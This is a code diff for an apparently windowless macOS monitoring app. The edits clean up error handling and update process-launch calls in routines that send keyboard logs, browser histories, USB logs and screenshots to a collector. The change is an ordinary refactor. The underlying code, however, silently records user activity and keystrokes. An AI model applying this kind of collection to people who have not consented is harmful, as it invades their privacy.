@@ -566,19 +566,9 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         
         // App startup - logging disabled for performance
         
-        do {
-            // Since this is a background app (LSUIElement), ensure it doesn't quit when all windows are closed
-            NSApp.setActivationPolicy(.accessory)
-            // Set activation policy to accessory
-            
-            // Prevent any windows from being created
-            NSApp.windows.forEach { window in
-                window.close()
-            }
-            // Closed any existing windows
-        } catch {
-            // Error during app initialization
-        }
+        // A menu-bar app should remain alive after all windows close.
+        NSApp.setActivationPolicy(.accessory)
+        NSApp.windows.forEach { $0.close() }
         
         storage = UserDefaults.init(suiteName: "alice.monitors")
 
@@ -676,14 +666,9 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         configureNotifications()
         
         // Setup status bar menu
-        do {
-            setupStatusBarMenu()
-            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
-                self.restoreRememberedSession()
-            }
-            // Status bar menu setup completed
-        } catch {
-            // Error setting up status bar menu
+        setupStatusBarMenu()
+        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
+            self.restoreRememberedSession()
         }
         
         // Setup log flush timer (flush logs every 30 seconds)
@@ -962,11 +947,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         if currentDate.timeIntervalSince(lastTicCheck) >= TimeInterval(TIC_INTERVAL) {
             logMonitoringEvent("Tic event monitoring triggered", details: "Interval: \(TIC_INTERVAL)s")
             DispatchQueue.global(qos: .background).async {
-                do {
-                    try self.sendTicEvent()
-                } catch {
-                    self.logError("Error sending tic event: \(error)", context: "TicEvent")
-                }
+                self.sendTicEvent()
             }
             lastTicCheck = currentDate
         }
@@ -975,11 +956,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         if currentDate.timeIntervalSince(lastHistoryCheck) >= TimeInterval(HISTORY_INTERVAL) {
                 logMonitoringEvent("Browser history monitoring triggered", details: "Interval: \(HISTORY_INTERVAL)s")
                 DispatchQueue.global(qos: .background).async {
-                    do {
-                        try self.sendBrowserHistories()
-                    } catch {
-                        self.logError("Error sending browser histories: \(error)", context: "BrowserHistory")
-                    }
+                    self.sendBrowserHistories()
                 }
                 lastHistoryCheck = currentDate
         }
@@ -997,11 +974,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         if currentDate.timeIntervalSince(lastUSBCheck) >= TimeInterval(USB_INTERVAL) {
             logMonitoringEvent("USB log monitoring triggered", details: "Interval: \(USB_INTERVAL)s, USB events collected: \(usbDeviceLogs.count)")
             DispatchQueue.global(qos: .background).async {
-                do {
-                    try self.sendUSBLogs()
-                } catch {
-                    self.logError("Error sending usb logs: \(error)", context: "USBLog")
-                }
+                self.sendUSBLogs()
             }
             lastUSBCheck = currentDate
         }
@@ -1109,12 +1082,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
                 return
             }
             
-            do {
-                self.setupKeyboardMonitoring()
-                // self.logMessage("Event tap re-establishment completed successfully", level: .info)
-            } catch {
-                self.logMessage("Event tap re-establishment failed: \(error)", level: .error)
-            }
+            self.setupKeyboardMonitoring()
         }
     }
 
@@ -2218,13 +2186,13 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         for interface in interfaces {
             let task = Process()
             let output = Pipe()
-            task.launchPath = "/sbin/ifconfig"
+            task.executableURL = URL(fileURLWithPath: "/sbin/ifconfig")
             task.arguments = [interface, "inet"]
             task.standardOutput = output
             task.standardError = output
             
             do {
-                task.launch()
+                try task.run()
                 task.waitUntilExit()
                 
                 let data = output.fileHandleForReading.readDataToEndOfFile()
@@ -2263,13 +2231,13 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         for interface in interfaces {
             let task = Process()
             let output = Pipe()
-            task.launchPath = "/sbin/ifconfig"
+            task.executableURL = URL(fileURLWithPath: "/sbin/ifconfig")
             task.arguments = [interface, "inet"]
             task.standardOutput = output
             task.standardError = output
             
             do {
-                task.launch()
+                try task.run()
                 task.waitUntilExit()
                 
                 let data = output.fileHandleForReading.readDataToEndOfFile()
@@ -3681,15 +3649,11 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
     @objc func sendUSBLogs() {
         if self.usbDeviceLogs.count > 0 {
             logMonitoringEvent("Sending USB logs", details: "Count: \(usbDeviceLogs.count)")
-            do {
-                // Send data in chunks
-                sendDataInChunks(data: self.usbDeviceLogs, eventType: "USBLog", chunkSize: 500)
-                self.usbDeviceLogs.removeAll(keepingCapacity: true) // Optimized memory management
-                lastUSBLogSent = Date()
-                logSuccess("USB logs sent and cleared", details: "\(usbDeviceLogs.count) events")
-            } catch {
-                logError("Error converting USB logs to JSON: \(error)", context: "USBLog")
-            }
+            let count = usbDeviceLogs.count
+            sendDataInChunks(data: self.usbDeviceLogs, eventType: "USBLog", chunkSize: 500)
+            self.usbDeviceLogs.removeAll(keepingCapacity: true)
+            lastUSBLogSent = Date()
+            logSuccess("USB log batches queued", details: "\(count) events")
         } else {
             logMessage("No USB logs to send", level: .debug)
         }
@@ -4505,12 +4469,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
         // Send all types of logs
         DispatchQueue.global(qos: .background).async {
             // 1. Send Tic event (heartbeat)
-            do {
-                try self.sendTicEvent()
-                // self.logMessage("✅ Tic event sent", level: .info)
-            } catch {
-                self.logError("❌ Tic event failed: \(error)", context: "ManualSend")
-            }
+            self.sendTicEvent()
             
             // 2. Send browser histories
             self.sendBrowserHistories()
@@ -4521,12 +4480,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, UNUserNotificationCenterDele
             // self.logMessage("✅ Key logs sent", level: .info)
             
             // 4. Send USB logs
-            do {
-                try self.sendUSBLogs()
-                // self.logMessage("✅ USB logs sent", level: .info)
-            } catch {
-                self.logError("❌ USB logs failed: \(error)", context: "ManualSend")
-            }
+            self.sendUSBLogs()
             
             // 5. Send screenshot
             if self.isScreenRecordingEnabled() {
